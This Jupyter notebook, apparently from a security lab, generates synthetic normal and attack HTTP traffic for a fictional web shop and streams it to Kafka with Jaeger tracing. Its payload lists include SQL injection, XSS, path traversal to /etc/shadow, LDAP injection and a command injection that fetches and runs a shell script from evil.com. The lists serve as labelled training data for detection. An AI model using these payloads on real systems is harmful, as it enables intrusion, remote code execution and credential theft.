# 1. HTTP Request Producer (HTTP Traffic → Kafka)

## Purpose

This notebook simulates a real-world HTTP traffic source — both **normal e-commerce traffic**
and **attack traffic** (SQL injection, XSS, command injection, path traversal, buffer overflow,
LDAP injection, parameter tampering).

Events are published to the Kafka topic `http.requests.raw` using the same architecture as Lab 5:
- Each request gets a unique `event_id`
- A **Jaeger trace** is started per event so the full pipeline lifecycle is visible end-to-end
- The producer does **not** know who will process the data

**Run this notebook first, then run notebook 2 in parallel.**

---

| Service | URL |
|---|---|
| Redpanda Console (Kafka UI) | http://localhost:8080 |
| Jaeger Tracing UI | http://localhost:16686 |

In [1]:
import json
import random
import time
import uuid
import os
import urllib.parse
import string
from datetime import datetime, timezone

from kafka import KafkaProducer

from opentelemetry import trace
from opentelemetry.sdk.resources import Resource
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
from opentelemetry.trace import SpanKind, TraceFlags, SpanContext, NonRecordingSpan, set_span_in_context

# ── Configuration ──────────────────────────────────────────────────────────
KAFKA_BOOTSTRAP  = os.environ.get('KAFKA_BOOTSTRAP', 'kafka:9092')
JAEGER_ENDPOINT  = os.environ.get('JAEGER_ENDPOINT', 'jaeger:4317')
TOPIC            = 'http.requests.raw'
N_REQUESTS       = 300      # total requests to generate (0 = infinite)
EVENT_INTERVAL   = (0.5, 2) # seconds between events (min, max)

print(f'Kafka : {KAFKA_BOOTSTRAP}')
print(f'Jaeger: {JAEGER_ENDPOINT}')
print(f'Topic : {TOPIC}')

Kafka : kafka:9092
Jaeger: jaeger:4317
Topic : http.requests.raw


In [2]:
# ── OpenTelemetry / Jaeger setup ───────────────────────────────────────────
resource = Resource.create({'service.name': 'http-request-producer'})
trace.set_tracer_provider(TracerProvider(resource=resource))
tracer = trace.get_tracer(__name__)

otlp_exporter = OTLPSpanExporter(endpoint=JAEGER_ENDPOINT, insecure=True)
trace.get_tracer_provider().add_span_processor(BatchSpanProcessor(otlp_exporter))

# ── Kafka producer ─────────────────────────────────────────────────────────
producer = KafkaProducer(
    bootstrap_servers=KAFKA_BOOTSTRAP,
    value_serializer=lambda v: json.dumps(v).encode('utf-8'),
)
print('Connected to Kafka and Jaeger.')

Connected to Kafka and Jaeger.


In [3]:
# ── HTTP Request Generators ────────────────────────────────────────────────
# Traffic mix:
#   ~60% normal sessions   (2-4 normal requests sharing a session cookie)
#   ~25% attack chains     (1-2 normal warmup → 2-3 escalating attacks)
#   ~15% random one-offs   (single anomalous request, no chain)

from collections import deque

HOST = 'localhost:8080'
BASE = f'http://{HOST}/tienda1'

USER_AGENTS = [
    'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
]
PRODUCTS  = ['Vino+Rioja', 'Cerveza+Artesanal', 'Aceite+Oliva',
             'Queso+Manchego', 'Jamon+Iberico', 'Salmon+Ahumado']
EMAILS    = ['juan@mail.com', 'maria@mail.com', 'carlos@mail.com',
             'ana@tienda.com', 'pedro@tienda.com']

SQL_PAYLOADS = [
    "' OR 'x'='x",
    '" OR "x"="x',
    "' OR 1=1 LIMIT 1--",
    "'; EXEC xp_cmdshell('whoami')--",
    "1 UNION ALL SELECT table_name,2 FROM information_schema.tables--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
]
XSS_PAYLOADS = [
    "<details open ontoggle=alert(1)>",
    "<body onpageshow=alert(document.domain)>",
    "<input autofocus onfocus=alert(document.domain)>",
]
CMD_PAYLOADS = [
    "; id && uname -a",
    "| net user",
    "; curl http://evil.com/shell.sh | sh",
    "; ping -c 4 attacker.com",
]
TRAVERSAL = [
    "....//....//....//etc/shadow",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../" * 5 + "etc/hosts",
]
LDAP_PAYLOADS = [
    ")(cn=*))(|(cn=*",
    "*)(objectClass=*))(|(objectClass=*",
    "admin)(&(password=*))",
]

# Attack chains: escalating stages a real attacker might follow
ATTACK_CHAINS = [
    ['path_traversal', 'sql_injection'],              # Recon → Credential access
    ['sql_injection', 'command_injection'],            # Auth bypass → RCE
    ['sql_injection', 'parameter_tampering'],          # Auth bypass → Data manipulation
    ['path_traversal', 'sql_injection', 'command_injection'],  # Full kill-chain
    ['xss', 'command_injection'],                     # Client attack → Escalation
    ['path_traversal', 'ldap_injection'],             # Recon → Directory attack
]

def _overflow():
    return 'B' * random.randint(400, 800)

def _sid():
    return 'JSESSIONID=' + ''.join(random.choices(string.hexdigits.upper(), k=32))

# ── Normal generators ───────────────────────────────────────────────────────
def normal_browse():
    p = random.choice(PRODUCTS)
    pid, price, qty = random.randint(1, 50), random.randint(50, 500), random.randint(1, 99)
    ep = random.choice(['anadir', 'buscar', 'caracteristicas'])
    return {'method': 'GET',
            'url': f'{BASE}/publico/{ep}.jsp?id={pid}&nombre={p}&precio={price}&cantidad={qty}',
            'body': '', 'label': 'normal'}

def normal_index():
    page = random.choice(['index.jsp', 'publico/pagar.jsp', 'publico/registro.jsp'])
    return {'method': 'GET', 'url': f'{BASE}/{page}', 'body': '', 'label': 'normal'}

def normal_post():
    return {'method': 'POST', 'url': f'{BASE}/publico/autenticar.jsp',
            'body': f'correo={random.choice(EMAILS)}&password=Pass{random.randint(1000, 9999)}',
            'label': 'normal'}

# ── Attack generators ───────────────────────────────────────────────────────
def attack_sqli():
    p = urllib.parse.quote(random.choice(SQL_PAYLOADS))
    return {'method': 'POST', 'url': f'{BASE}/publico/autenticar.jsp',
            'body': f'correo={p}&password=anything', 'label': 'anomalous'}

def attack_xss():
    p = urllib.parse.quote(random.choice(XSS_PAYLOADS))
    return {'method': 'GET', 'url': f'{BASE}/publico/buscar.jsp?query={p}',
            'body': '', 'label': 'anomalous'}

def attack_cmd():
    p = urllib.parse.quote(random.choice(CMD_PAYLOADS))
    return {'method': 'GET', 'url': f'{BASE}/publico/buscar.jsp?query=item{p}',
            'body': '', 'label': 'anomalous'}

def attack_traversal():
    p = urllib.parse.quote(random.choice(TRAVERSAL))
    ep = random.choice(['caracteristicas', 'anadir'])
    return {'method': 'GET', 'url': f'{BASE}/publico/{ep}.jsp?id={p}',
            'body': '', 'label': 'anomalous'}

def attack_overflow():
    return {'method': 'GET',
            'url': f'{BASE}/publico/buscar.jsp?query={urllib.parse.quote(_overflow())}',
            'body': '', 'label': 'anomalous'}

def attack_ldap():
    p = urllib.parse.quote(random.choice(LDAP_PAYLOADS))
    return {'method': 'POST', 'url': f'{BASE}/publico/autenticar.jsp',
            'body': f'correo={p}&password=anything', 'label': 'anomalous'}

def attack_parameter_tampering():
    p = random.choice(PRODUCTS)
    return {'method': 'GET',
            'url': f'{BASE}/publico/anadir.jsp?id={random.randint(1,50)}&nombre={p}&precio=-1&cantidad=-99999',
            'body': '', 'label': 'anomalous'}

ATTACK_GEN_MAP = {
    'sql_injection':       attack_sqli,
    'xss':                 attack_xss,
    'command_injection':   attack_cmd,
    'path_traversal':      attack_traversal,
    'buffer_overflow':     attack_overflow,
    'ldap_injection':      attack_ldap,
    'parameter_tampering': attack_parameter_tampering,
}
RANDOM_ATTACK_GENS = list(ATTACK_GEN_MAP.values())
NORMAL_GENS = [normal_browse, normal_browse, normal_browse, normal_post, normal_post, normal_index]

# ── Session queue ───────────────────────────────────────────────────────────
_event_queue = deque()

def _stage_normal_session():
    sid = _sid()
    for _ in range(random.randint(2, 4)):
        req = random.choice(NORMAL_GENS)()
        req['cookie'] = sid
        _event_queue.append(req)

def _stage_chain_session():
    sid = _sid()
    # 1-2 normal warmup requests (attacker blending in)
    for _ in range(random.randint(1, 2)):
        req = random.choice([normal_browse, normal_post])()
        req['cookie'] = sid
        _event_queue.append(req)
    # Escalating attack stages
    chain = random.choice(ATTACK_CHAINS)
    for attack_type in chain:
        req = ATTACK_GEN_MAP[attack_type]()
        req['cookie'] = sid
        _event_queue.append(req)

def generate_event():
    if not _event_queue:
        r = random.random()
        if r < 0.60:
            _stage_normal_session()
        elif r < 0.85:
            _stage_chain_session()
        else:
            # Random one-off attack — no session linkage
            req = random.choice(RANDOM_ATTACK_GENS)()
            req['event_id']   = str(uuid.uuid4())
            req['timestamp']  = datetime.now(timezone.utc).isoformat()
            req['user_agent'] = random.choice(USER_AGENTS)
            req['cookie']     = _sid()
            return req

    req = _event_queue.popleft()
    req['event_id']   = str(uuid.uuid4())
    req['timestamp']  = datetime.now(timezone.utc).isoformat()
    req['user_agent'] = random.choice(USER_AGENTS)
    return req

print('Generators ready  (normal sessions / attack chains / random one-offs).')


Generators ready  (normal sessions / attack chains / random one-offs).


In [ ]:
# ── Main production loop ───────────────────────────────────────────────────
# Set N_REQUESTS = 0 for infinite streaming
print(f'Starting producer — sending {N_REQUESTS if N_REQUESTS else "∞"} requests to [{TOPIC}]...')
print('Check Redpanda Console → http://localhost:8080')
print('Check Jaeger traces   → http://localhost:16686')
print('-' * 60)

sent = 0
try:
    while (N_REQUESTS == 0) or (sent < N_REQUESTS):
        event    = generate_event()
        event_id = event['event_id']

        # Derive trace_id from event_id so producer+consumer share one trace in Jaeger
        trace_id = uuid.UUID(event_id).int
        parent_ctx = set_span_in_context(
            NonRecordingSpan(SpanContext(
                trace_id=trace_id,
                span_id=random.getrandbits(64),
                is_remote=False,
                trace_flags=TraceFlags(TraceFlags.SAMPLED),
                trace_state={},
            ))
        )

        with tracer.start_as_current_span('produce_http_request', context=parent_ctx, kind=SpanKind.PRODUCER) as span:
            span.set_attribute('event.id',    event_id)
            span.set_attribute('http.method', event['method'])
            span.set_attribute('http.url',    event['url'])
            span.set_attribute('event.label', event['label'])

            with tracer.start_as_current_span('kafka.produce'):
                producer.send(TOPIC, event)
                producer.flush()

        sent += 1
        print(f'[{sent:>4}] {event["label"]:<10} {event["method"]} {event["url"][:80]}')
        time.sleep(random.uniform(*EVENT_INTERVAL))

except KeyboardInterrupt:
    print('\nProducer stopped.')
finally:
    producer.close()
    print(f'Total sent: {sent}')

Starting producer — sending 300 requests to [http.requests.raw]...
Check Redpanda Console → http://localhost:8080
Check Jaeger traces   → http://localhost:16686
------------------------------------------------------------
[   1] anomalous  POST http://localhost:8080/tienda1/publico/autenticar.jsp
[   2] normal     POST http://localhost:8080/tienda1/publico/autenticar.jsp
[   3] normal     POST http://localhost:8080/tienda1/publico/autenticar.jsp
[   4] anomalous  POST http://localhost:8080/tienda1/publico/autenticar.jsp
[   5] anomalous  GET http://localhost:8080/tienda1/publico/buscar.jsp?query=item%3B%20curl%20http%3A/
[   6] anomalous  GET http://localhost:8080/tienda1/publico/buscar.jsp?query=%3Cbody%20onpageshow%3Dal
[   7] normal     GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=49&nombre=Salmon+Ah
[   8] normal     GET http://localhost:8080/tienda1/publico/anadir.jsp?id=31&nombre=Aceite+Oliva&preci
[   9] normal     POST http://localhost:8080/tienda1/publico/a